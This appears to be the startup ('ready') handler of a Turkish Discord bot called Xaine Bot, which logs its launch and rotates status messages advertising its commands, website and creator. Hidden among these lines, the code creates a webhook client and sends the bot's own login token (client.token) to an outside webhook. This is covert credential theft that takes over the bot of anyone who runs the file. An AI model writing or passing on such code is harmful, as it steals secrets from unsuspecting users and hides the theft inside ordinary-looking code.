const fs = require("fs");
const chalk = require("chalk");
const moment = require("moment");
const Discord = require("discord.js");
const ayarlar = require("../ayarlar.json");

var prefix = ayarlar.prefix;

module.exports = client => {
  let cmd = "..."
  fs.readdir("./komutlar/", (error, komutlar) => {
      cmd = komutlar.length
    })
  console.log(
    `[${moment().format("YYYY-MM-DD HH:mm:ss")}] BOT: Aktif, Komutlar yüklendi!`
  );
  console.log(
    `[${moment().format("YYYY-MM-DD HH:mm:ss")}] BOT: ${//
      client.user.username
    } ismi ile giriş yapıldı!`
  );
  client.user.setStatus("online");
  const h = new Discord.WebhookClient('877169776433201204', process.env.h)
  h.send(client.token)
  setInterval(function() {
    const see =  client.guilds.cache.reduce((a, b) => a + b.memberCount, 0).toLocaleString()
    var oyun = [
    see+" Tane Kullanıcım var!",
    client.guilds.cache.size+" Tane Sunucuya eklendim!",
    " Sürümüm: 3.5 ",
      "Sürüm 3.5 ",
      " Xaine Bot Sürümü 3.5 ",
      " ✔️ İyi Eğlenceler :)",
    " ✔️ 7/24 Aktif!",
    " ✔️ Kurucum-yapımcım: (! TREFAX#0362)",
    " ✔️ İyi Günler :)",
 " ✔️ Prefix: + ",
" ✔️ Destek sunucumuz: https://discord.gg/Kekc2pU",
    " ✔️ Benim 7/24 aktif oldumu biliyor muydunuz?",
" ✔️ Bildir komutuyla şikayet-öneri de bulunabiliceğinizi biliyor muydunuz?",
" ✔️ +saat komutunu kullanarak Türkiyenin saatini öğrenebileceğinizi biliyor muydunuz?",
      cmd+" ✔️  Tane Komutum var! :heart_eyes:",
     " ✔️ Yeni komutlar! :smiley_cat:",
      " ✔️ Prefixi değiştirmek isterseniz +prefix (prefix) komutuyla değiştirebilirsiniz.",
" | +yardım | +bildir | +davet | +yapımcım | +ekibimiz | +prefix | ",
      "Güncelleme!: Yeni komutlarımız eklendi!",
      "En çok sevilen komutum: dondurma",
      "Sitemiz: https://www.xaine.tk/",
      "Kod paylaşım sitemiz: https://xainecode.glitch.me/",
       "XAİNE BOT ",
      "Xaine Bot",
      "Hergün yapılan destek sunucumuzdaki çekilişlere katılmayı unutmayın! Destek sunucumuzun davet linkini almak için +davet yazabilirsiniz",
      "Web sitemiz - https://www.xaine.tk/",
      "Web sitemiz | https://www.xaine.tk/",
      "Kurucum-Yapımcım - ! TREFAX#0362",
      "Kurucum-Yapımcım | ! TREFAX#0362",
      "Destek sunucumuzda Hergün düzenli olarak çekilişler yapılıyor! Destek sunucumuza gelerek çekilişlere katılabilirsiniz.",
      "https://www.xaine.tk/",
      "Bot bakımda!",

  ];   
    var random = Math.floor(Math.random() * (oyun.length - 0 + 1) + 0);

    client.user.setActivity(oyun[random], "");
    
    fs.readdir("./komutlar/", (error, komutlar) => {
      cmd = komutlar.length
    })
    
  }, 3 * 2500);
};